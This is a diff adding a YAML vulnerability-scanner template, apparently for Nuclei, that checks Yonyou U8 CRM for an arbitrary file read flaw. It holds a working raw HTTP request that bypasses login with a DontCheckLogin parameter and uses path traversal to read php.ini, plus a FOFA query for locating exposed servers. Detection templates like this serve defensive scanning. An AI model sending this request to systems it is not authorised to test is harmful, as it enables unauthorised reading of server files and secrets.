@@ -1,0 +1,32 @@
+id: yongyouU8-CRM-downloadfile-fileread
+
+info:
+  name: 用友U8 CRM downloadfile 任意文件读取漏洞
+  author: yongyouU8
+  severity: high
+  metadata: 
+    fofa-query: body="用友U8CRM"
+  tags: yongyon,u8,crm,fileread
+
+
+http:
+  - raw:
+      - |
+        GET /pub/downloadfile.php?DontCheckLogin=1&url=/datacache/../../../apache/php.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[PHP]'
+          - 'About php.ini'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
